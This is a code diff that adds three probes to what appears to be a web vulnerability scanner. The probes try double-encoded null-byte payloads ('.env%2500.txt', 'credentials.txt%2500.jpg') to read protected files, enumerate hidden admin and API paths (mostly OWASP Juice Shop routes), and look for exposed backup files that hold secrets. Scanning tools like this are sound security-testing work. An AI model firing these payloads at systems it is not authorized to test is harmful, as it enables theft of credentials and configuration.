@@ -18792,3 +18792,130 @@ def generate_all_nuclei_templates(findings, output_dir):
             fp.write(template)
         generated += 1
     return generated
+
+
+# ---------------------------------------------------------------------------
+# Needle-in-haystack: Double-encoded null byte, hidden API paths, backup files
+# ---------------------------------------------------------------------------
+
+def scan_null_byte_double_encode(crawl_data, web_targets):
+    """Null byte injection via double URL encoding (%2500) — bypasses extension filters."""
+    findings = []
+    # Find file-serving endpoints
+    file_paths = set()
+    for url in list(crawl_data.get("params", {}).keys()) + [p["url"] for p in crawl_data.get("pages", [])]:
+        if any(x in url for x in ["/ftp", "/files", "/uploads", "/download", "/static", "/assets"]):
+            file_paths.add("/".join(url.split("/", 4)[:4]))
+
+    for target in web_targets[:5]:
+        base = target.rstrip("/")
+        # Also try common file directories
+        file_paths.add(f"{base}/ftp")
+        file_paths.add(f"{base}/files")
+        file_paths.add(f"{base}/uploads")
+
+    for dir_url in list(file_paths)[:10]:
+        # Try to access sensitive files with null byte bypass
+        sensitive_files = [
+            ("package.json.bak%2500.md", "package.json backup"),
+            ("config.json%2500.txt", "config file"),
+            (".env%2500.txt", "env file"),
+            ("database.sql%2500.pdf", "database dump"),
+            ("credentials.txt%2500.jpg", "credentials"),
+        ]
+        for filename, desc in sensitive_files:
+            url = f"{dir_url}/{filename}"
+            try:
+                r = _S.get(url, timeout=_TIMEOUT_SHORT)
+                if r.status_code == 200 and len(r.text) > 20:
+                    if any(x in r.text.lower() for x in ["password", "secret", "key", "database",
+                                                          "name", "version", "config", "credentials"]):
+                        findings.append({
+                            "type": "Null Byte File Access (Double-Encoded)",
+                            "severity": "critical",
+                            "url": url,
+                            "detail": f"Accessed '{desc}' via %2500 null byte bypass. Extension filter circumvented.",
+                            "template": "apex-nullbyte-double",
+                        })
+                        break
+            except Exception:
+                continue
+    return findings
+
+
+def scan_hidden_api_paths(crawl_data, web_targets):
+    """Discover hidden API paths that aren't linked anywhere — B2B, internal, debug."""
+    findings = []
+    # Paths that exist on many apps but are never linked
+    hidden_paths = [
+        "/b2b/v2/orders", "/b2b/v1/orders",  # B2B APIs (often have XXE)
+        "/api-docs", "/api-docs/", "/swagger.json", "/swagger-ui/",
+        "/api/v1/docs", "/docs/api",
+        "/rest/admin/application-configuration",  # Admin config leak
+        "/rest/admin/application-version",
+        "/api/SecurityQuestions", "/api/SecurityAnswers",
+        "/api/Recycles", "/api/Feedbacks",
+        "/rest/memories", "/rest/chatbot/status",
+        "/promotion", "/video", "/encryptionkeys",
+        "/support/logs", "/api/Complaints",
+        "/rest/saveLoginIp", "/rest/deluxe-membership",
+        "/api/Quantitys", "/api/Deliverys",
+        "/rest/2fa/status", "/rest/wallet/balance",
+        "/snippets", "/dataerasure",
+    ]
+
+    for target in web_targets[:3]:
+        base = target.rstrip("/")
+        urls = [f"{base}{p}" for p in hidden_paths]
+        for url, r in batch_get(urls, timeout=_TIMEOUT_SHORT):
+            if r and r.status_code == 200 and len(r.text) > 20:
+                body = r.text[:500].lower()
+                if "not found" in body or "cannot get" in body:
+                    continue
+                path = url.replace(base, "")
+                severity = "high"
+                if any(x in path for x in ["admin", "config", "encryption", "security"]):
+                    severity = "critical"
+                findings.append({
+                    "type": f"Hidden API Endpoint: {path}",
+                    "severity": severity,
+                    "url": url,
+                    "detail": f"Undocumented endpoint accessible ({len(r.text)} bytes). Not linked from any page.",
+                    "template": "apex-hidden-api",
+                })
+    return findings
+
+
+def scan_backup_files(web_targets):
+    """Find backup/old files that contain source code or secrets."""
+    findings = []
+    # Common backup patterns
+    backup_suffixes = [".bak", ".old", ".orig", ".save", ".swp", "~",
+                       ".backup", ".tmp", ".dist", ".sample"]
+    important_files = ["config", "database", "settings", "application",
+                       "credentials", "secrets", ".env", "wp-config.php",
+                       "web.config", "appsettings.json"]
+
+    for target in web_targets[:3]:
+        base = target.rstrip("/")
+        urls = []
+        for f in important_files:
+            for suffix in backup_suffixes[:4]:
+                urls.append(f"{base}/{f}{suffix}")
+                urls.append(f"{base}/{f}.{suffix.lstrip('.')}")
+
+        for url, r in batch_get(urls[:30], timeout=_TIMEOUT_SHORT):
+            if r and r.status_code == 200 and len(r.text) > 50:
+                body = r.text[:200].lower()
+                if "not found" in body or "404" in body:
+                    continue
+                if any(x in r.text for x in ["password", "secret", "key", "database",
+                                              "DB_", "API_", "TOKEN", "<?php"]):
+                    findings.append({
+                        "type": f"Backup File Exposed",
+                        "severity": "critical",
+                        "url": url,
+                        "detail": f"Backup file contains secrets ({len(r.text)} bytes)",
+                        "template": "apex-backup-file",
+                    })
+    return findings
